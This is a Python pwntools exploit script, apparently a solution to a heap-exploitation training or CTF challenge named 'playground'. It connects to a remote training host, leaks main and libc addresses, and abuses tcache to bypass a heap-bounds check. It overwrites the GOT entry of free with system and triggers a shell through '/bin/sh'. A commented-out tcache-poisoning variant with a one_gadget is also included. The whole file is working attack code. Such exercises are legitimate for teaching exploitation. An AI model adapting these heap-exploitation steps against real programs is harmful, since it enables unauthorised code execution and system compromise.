from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    # ssh = ssh("acidburn", "192.168.56.104")
    r = process("./playground")
    gdb.attach(r, """
        c
        """)
    input("wait")
else:
	r = remote("bin.training.jinblack.it", 4010)

def malloc(size):
    r.recvuntil("> ")
    r.sendline("malloc %d" % size)
    r.recvuntil("==> ")
    address = int(r.recvuntil("\n"),16) #Integer base 16
    return address

def malloc_no_return(size):
    r.recvuntil("> ")
    r.sendline("malloc %d" % size)

def free(ptr):
    r.recvuntil("> ")
    r.sendline("free %#x" % ptr)
    r.recvuntil("==> ok")

def free_no_recv(ptr):
    r.recvuntil("> ")
    r.sendline("free %#x" % ptr)

def show(ptr, size):
	output = []
	r.recvuntil("> ")
	r.sendline("show %#x %d" % (ptr,size))
	for i in range(size):
		data = r.recvline().split(b":   ")[1].strip() #strip is needed to remove spaces before and after
		if(data == b''):
			v = 0
		else:
			v = int(data,16) #convert to the given base (hex in this case)
		output.append(v) #add the item to the array
	return output
	
def write(ptr, data):
	r.recvuntil(b"> ")
	r.sendline("write %#x %d" % (ptr, len(data)))
	r.recvuntil("==> read\n")
	r.send(data)
	return

#[READ MAIN] They give it to us
r.recvuntil(b"main: ")
main_leak = int(r.recvuntil(b"\n")[:-1],16)
print("[!] main_leak: %#x" % main_leak)

#[LEAK LIBC]
chunk = malloc(1792) #in hex 0x700 greater than the 0x500 of the tcache in unsorted bins
malloc(20) #added to avoid consolidation with top chunk
free(chunk)
values = show(chunk,8)
libc_leak = values [0]
print("[!] libc_leak: %#x" % libc_leak)
libc_base = libc_leak - 0x3ebca0 #0x7ffff7dcfca0 - 0x007ffff79e4000
print("[!] libc_base: %#x" % libc_base)

#[OFFSETS DATA]
malloc_hook = libc_base + 0x3ebc30
print("[!] malloc_hook: %#x" % malloc_hook)
free_hook = libc_base + 0x3ed8e8
print("[!] free_hook: %#x" % free_hook)
fake_chunk_malloc = malloc_hook - 0x23
print("[!] fake_chunk_malloc: %#x" % fake_chunk_malloc)
fake_chunk_free = free_hook - 0x13
print("[!] fake_chunk_free: %#x" % fake_chunk_free)
one_gadget = libc_base + 0x4f432 #0x4f3d5 #0x10a41c #0x4f432
print("[!] one_gadget: %#x" % one_gadget)
system = libc_base + 0x4f550
print("[!] system: %#x" % system)

#[BYPASS HEAP CHECK]
#We need to overwrite the min_heap global variable we can use the key value present in libc27
#Which is present but not set (so null value is in it). The check with the set key is present only in following versions.
min_heap = main_leak +  0x2ecf
print("[!] min_heap: %#x" % min_heap)

temp_SIZE = 128
addr = malloc(temp_SIZE)
free(addr)
write(addr, p64(min_heap - 8))
malloc(temp_SIZE) #addr
malloc(temp_SIZE) #min_heap - 8

#[FREE_HOOK EXPLOIT USING GOT] #Now we can write anywhere
got_free_leak = main_leak + 0x2e3f
print("[!] got_free_leak: %#x" % got_free_leak)
write(got_free_leak, p64(system))
write(addr, b"/bin/sh\x00")
free_no_recv(addr) #system called instead of free

"""#[PERFORM TCACHE POISONING] #Not working due to check on write outside heap
SIZE = 0x60
t1 = malloc(SIZE)
t2 = malloc(SIZE)
free(t1)
free(t2)
print("[*] t1(%#x) = %#x" % (t1, show(t1, 1)[0]))
print("[*] t2(%#x) = %#x" % (t2, show(t2, 1)[0]))
write(t2, p64(fake_chunk_malloc))
print("[*] write fake chunk ==> t2(%#x) = %#x" % (t2, show(t2, 1)[0]))
malloc(SIZE) #Now the fake chunk is the first in the list. Will be returned at the next call

#[ALLOCATE FAKE CHUNK AND WRITE IT]
t3 = malloc(SIZE)
write(t3, b"Z"*13 + p64(one_gadget))
malloc_no_return(SIZE)
#malloc_no_return(SIZE)"""

r.interactive()

